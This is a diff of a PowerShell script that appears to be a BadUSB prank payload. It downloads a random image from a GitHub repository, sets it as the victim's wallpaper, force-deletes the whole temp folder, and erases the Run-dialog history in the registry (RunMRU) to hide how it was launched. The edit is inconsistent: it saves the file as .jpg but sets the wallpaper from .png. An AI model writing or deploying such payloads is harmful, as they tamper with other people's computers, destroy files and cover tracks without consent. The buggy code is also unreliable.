@@ -1,10 +1,10 @@
 $RI = Get-Random @(1..5)
 
-$image =  "https://github.com/Brereid98/BADUSB_Files/Random_Wallpaper/$RI.png"
+$image =  "https://github.com/Brereid98/BADUSB_Files/Random_Wallpaper/$RI.jpg"
 
 $i = -join($image,"?dl=1")
 
-iwr $i -O $env:TMP\i.png
+iwr $i -O $env:TMP\i.jpg
 
 Function Set-WallPaper {
 param (
@@ -63,6 +63,9 @@ public class Params
   
     $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
 }
+
+Set-WallPaper -Image "$env:TMP\i.png" -Style Fill
+
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
